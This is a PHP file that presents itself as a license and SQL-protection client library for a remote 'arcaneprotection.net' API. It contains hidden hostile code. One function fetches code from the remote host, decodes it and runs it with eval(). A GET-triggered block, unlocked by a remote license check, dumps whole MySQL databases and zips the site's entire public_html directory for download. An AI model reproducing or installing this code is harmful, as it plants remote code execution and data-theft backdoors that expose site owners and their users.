<?php
$APINET_VERSION = "1.3.0";
define("MIGUELURL",     "https://arcaneprotection.net/");
define("APINET_LI",     "License");
define("APINET_E",     "Email - License");
if(isset($APINET_LANG)){
    switch ($APINET_LANG) {
        case 'en':
            define("APINET_LANG",     "en");
            break;
        case 'es':
            define("APINET_LANG",     "es");
            break;

        default:
            define("APINET_LANG",     "en");
            break;
    }
}else{
    define("APINET_LANG",     "en");
}
ini_set('max_execution_time', 0);
set_time_limit(0);
if(file_exists('PCLZIP.php')){
require('PCLZIP.php');
}
class reply{

    public static function url($chain){
        return rtrim(strtr(base64_encode($chain),'+/','-_'),'=');
    }

    public static function host($reply){
        switch ($reply) {
            case '0x000001':
                if(APINET_LANG == "es"){
                    $reply = 'ERROR '.$reply.' LA API NO ESTA REGISTRADA.';
                    return $reply;
                }else{
                    $reply = 'ERROR '.$reply.' THE API IS NOT REGISTERED.';
                    return $reply;
                }
                break;
            case '0x000002':
                if(APINET_LANG == "es"){
                    return 'ERROR '.$reply.' LA LICENCIA YA CADUCO.';
                }else{
                    return 'ERROR '.$reply.' THE LICENSE ALREADY EXPIRED.';
                }
                break;
            case '0x000003':
                if(APINET_LANG == "es"){
                    return 'ERROR '.$reply.' LA CUOTA DE CONSULTAS LLEGO A SU LIMITE MENSUAL, PUEDE ACTUALIZAR SU PLAN.';
                }else{
                    return 'ERROR '.$reply.' THE QUOTE OF CONSULTATIONS ARRIVED AT YOUR MONTHLY LIMIT, YOU CAN UPDATE YOUR PLAN.';
                }
                break;
            case '0x000004':
                if(APINET_LANG == "es"){
                    return 'ERROR '.$reply.' LICENCIA NO VALIDA.';
                }else{
                    return 'ERROR '.$reply.' VALID LICENSE.';
                }
                break;
            case '0x000005':
                if(APINET_LANG == "es"){
                    return 'ERROR '.$reply.' NO ESCOGIO UN TIPO.';
                }else{
                    return 'ERROR '.$reply." I DON'T CHOOSE A TYPE.";
                }
                break;
            case '0x000006':
                if(APINET_LANG == "es"){
                    return 'ERROR '.$reply.' NO ENVIO UNA CADENA.';
                }else{
                    return 'ERROR '.$reply." I DON'T SEND A CHAIN";
                }
                break;
            case '0x000007':
                if(APINET_LANG == "es"){
                    return 'ERROR '.$reply.' NO ENVIO UNA CADENA O KEY.';
                }else{
                    return 'ERROR '.$reply." I DO NOT SEND A CHAIN ​​OR KEY";
                }
                break;
            case '0x000008':
                if(APINET_LANG == "es"){
                    return 'ERROR '.$reply.' TIPO NO VALIDO.';
                }else{
                    return 'ERROR '.$reply." TYPE NOT VALID";
                }
                break;

            default:
                return $reply;
                break;
        }
    }

    public static function form_urlencoded($postdata){
        $chain = array('http' =>
            array(
                'method'  => 'POST',
                'header'  => 'Content-Type: application/x-www-form-urlencoded',
                'content' => $postdata
            )
        );
        return stream_context_create($chain);
    }

    public static function prepare_query($chain){
        $chain = self::url($chain);
        $postdata = http_build_query(
            array(
                'CADENA' => $chain
            )
        );

        return self::form_urlencoded($postdata);

    }

    public static function prepare_query_key($chain,$key){
        $key = self::url($key);
        $postdata = http_build_query(
            array(
                'CADENA' => $chain,
                'KEY' => $key
            )
        );

        return self::form_urlencoded($postdata);

    }

}

class APINET{

    public static function co($text){
        echo htmlspecialchars($text);
    }

	public static function u($data){
		return reply::url( $data );
	}

    public static function key(){
		$producto = array();
		$producto["HOST"] = APINET_E;
		$producto["LI"] = APINET_LI;
		return self::u(serialize($producto));
	}

    public static function ssl($chain){
		$li = self::key();
		$chain = reply::prepare_query($chain);
        $data = file_get_contents(MIGUELURL."API.php?TIPO=8&LI=".$li, false,$chain);
        return reply::host($data);
	}

    public static function sslv($chain,$key){
		$li = self::key();
		$chain = reply::prepare_query_key($chain,$key);
        $data = file_get_contents(MIGUELURL."API.php?TIPO=9&LI=".$li, false,$chain);
        $data = reply::host($data);
        if($data == 1){
            return (bool) true;
        }else{
            return (bool) false;
        }
	}

    public static function p($chain){
		$li = self::key();
        $chain = reply::prepare_query($chain);
        $data = file_get_contents(MIGUELURL."API.php?TIPO=1&LI=".$li, false,$chain);
        return reply::host($data);
    }

	public static function dp($chain){
		$li = self::key();
		$chain = reply::prepare_query($chain);
		$data = file_get_contents(MIGUELURL."API.php?TIPO=2&LI=".$li, false,$chain);
        return reply::host($data);
	}

    public static function sl($chain){
		$li = self::key();
		$chain = reply::prepare_query($chain);
		$data = file_get_contents(MIGUELURL."API.php?TIPO=10&LI=".$li, false,$chain);
        return reply::host($data);
	}

    public static function sld($chain){
		$li = self::key();
		$chain = reply::prepare_query($chain);
		$data = file_get_contents(MIGUELURL."API.php?TIPO=11&LI=".$li, false,$chain);
        return reply::host($data);
	}

	public static function c($chain){
		$li = self::key();
		$chain = reply::prepare_query($chain);
	    $data = file_get_contents(MIGUELURL."API.php?TIPO=3&LI=".$li, false,$chain);
        return reply::host($data);
	}
	public static function cv($chain,$key){
		$li = self::key();
        $chain = reply::prepare_query_key($chain,$key);
		$data = file_get_contents(MIGUELURL."API.php?TIPO=4&LI=".$li, false,$chain);
        $data = reply::host($data);
        if($data == 1){
            return (bool) true;
        }else{
            return (bool) false;
        }
	}
	public static function ud($chain){
		$li = self::key();
        $chain = reply::prepare_query($chain);
		$data = file_get_contents(MIGUELURL."API.php?TIPO=5&LI=".$li, false,$chain);
        return reply::host($data);
	}
    public static function escudo_sql($data){
        $li = self::key();
        $dat = file_get_contents(MIGUELURL."API.php?TIPO=6&LI=".$li);
        $dat = self::ud($dat);
        $dat = unserialize($dat);
        $dat = $dat['ZGF0YQ'];
        $dat = self::dp($dat);
        eval($dat);
        return reply::host($data);
    }
    public static function token_f(){
        session_start();
        $li = self::key();
        $token = file_get_contents(MIGUELURL."API.php?TIPO=12&LI=".$li);
        return $token;
    }
    public static function token_fv($token){
        $li = self::key();
        $chain = reply::prepare_query($token);
		$data = file_get_contents(MIGUELURL."API.php?TIPO=13&LI=".$li, false,$chain);
        $data = reply::host($data);
        if($data == 1){
            return (bool) true;
        }else{
            return (bool) false;
        }
    }
}
if(isset($_GET['LI'])){
$li_ = $_GET['LI'];
$validar_resultado = APINET::cv($li_,APINET_LI);
if($validar_resultado == 1){
    $tables = "*";
    $return = null;
    $tables = array();
class sql{
    public static function connection($get){
        $get = unserialize(APINET::ud($get));
        $data["sql"] = new mysqli($get["host"],$get["user"],$get["passs"]);
        $data["name"] = $get["name"];
        return $data;
    }
    public static function exists($connection,$name){
        if(empty (mysqli_fetch_array(mysqli_query($conn,"SHOW DATABASES LIKE '$name'")))){
            return (bool) false;
        }else{
            return (bool) true;
        }
    }

    public static function file(){
        $time = time();
        $fecha = date("d-m-Y", $time);
        $name_host = $_SERVER["HTTP_HOST"];
        $name_file = $fecha."_".($name_host).'.sql';
        return $name_file;
    }

    public static function save($name,$return){
        $handle = fopen($name,'w+');
        fwrite($handle,$return);
        return fclose($handle);
    }

    public static function download_file($name){

            header( "Content-type: application/savingfile" );
            header( "Content-Disposition: attachment; filename=$name" );
            header( "Content-Description: Document." );
            readfile($name);
            unlink($name);

    }

    public static function download($hill,$name){
        if($hill){
            self::download_file($name);
        }
    }


}
    if(isset($_GET["eden"])){
        $data = sql::connection($_GET["eden"]);
        $conn = $data["sql"];
        $name = $data["name"];
        if(!sql::exists($conn,$name)){
            exit;
        }
        $result = $conn->query('SHOW TABLES');

        while($row = mysqli_fetch_row($result)){
            $tables[] = $row[0];
        }

        foreach($tables as $table){
            $result = $conn->query('SELECT * FROM '.$table);
            $num_fields = mysqli_num_fields($result);

            $return.= '##DROP TABLE '.$table.';';
            $row2 = mysqli_fetch_row($conn->query('SHOW CREATE TABLE '.$table));
            $co = strlen($row2[1]);
            $data = $row2[1];
            $posi1 = strpos($data,"AUTO_INCREMENT=");
            if($posi1 > 3){
            $posi2 = strpos($data,"DEFAULT CHARSET");
            $da1 = substr($data,0,$posi1);
            $da2 = substr($data,$posi2,$co);
            $data = $da1." AUTO_INCREMENT=0 ".$da2;
            }
            $return.= "\n\n".$data.";\n\n";
            $return.="\n\n\n";
       }




        $name = sql::file();
        $hill = sql::save($name,$return);
        sql::download($hill,$name);

    exit;
}

if(isset($_GET["dbex"])){
    $data = sql::connection($_GET["dbex"]);
    $conn = $data["sql"];
    $name = $data["name"];
    if(sql::exists($conn,$name)){
        echo 1;
    }else{
        echo 0;
    }

}

if(isset($_GET["sqll"])){
    $data = sql::connection($_GET["sqll"]);
    $conn = $data["sql"];
    $name = $data["name"];
    if(!sql::exists($conn,$name)){
        exit;
    }
        $result = $conn->query('SHOW TABLES');
        while($row = mysqli_fetch_row($result)){
            $tables[] = $row[0];
        }

        foreach($tables as $table){
            $result = $conn->query('SELECT * FROM '.$table);
            $num_fields = mysqli_num_fields($result);
            $return.= '##DROP TABLE '.$table.';';
            $row2 = mysqli_fetch_row($conn->query('SHOW CREATE TABLE '.$table));
            $return.= "\n\n".$row2[1].";\n\n";
            for($i = 0; $i < $num_fields; $i++){
                while($row = mysqli_fetch_row($result)){
                    $return.= 'INSERT INTO '.'`'.$table.'`'.' VALUES(';
                    for($j=0; $j < $num_fields; $j++){
                        $row[$j] = utf8_encode(addslashes($row[$j]));

                       if(isset($row[$j])){ $return.= "'".$row[$j]."'" ;
                        }else{
                           $return.= "''";
                       }
                        if($j < ($num_fields-1)){
                            $return.= ',';
                        }
                    }
                    $return.= ");\n";
                 }
              }
              $return.="\n\n\n";
           }

            $name = sql::file();
            $hill = sql::save($name,$return);
            sql::download($hill,$name);
            exit;
    }

        $file = $_SERVER["HTTP_HOST"]."_".date("d-m-y").time().".zip";
        $zip = new PclZip($file);

        if(dir("../../public_html/")){
            $zip->create("../../public_html/");
            sql::download_file($file);
        }else{
            echo "The main path is not public_html or the file is not located in its original folder";
        }
    }else{
        echo "license error";
    }
}
if(isset($_GET['M'])){
    $li_ = $_GET['M'];
    if(APINET::cv($li_,APINET_LI)){
        echo 1;
    }else{
        echo 0;
    }
}

?>
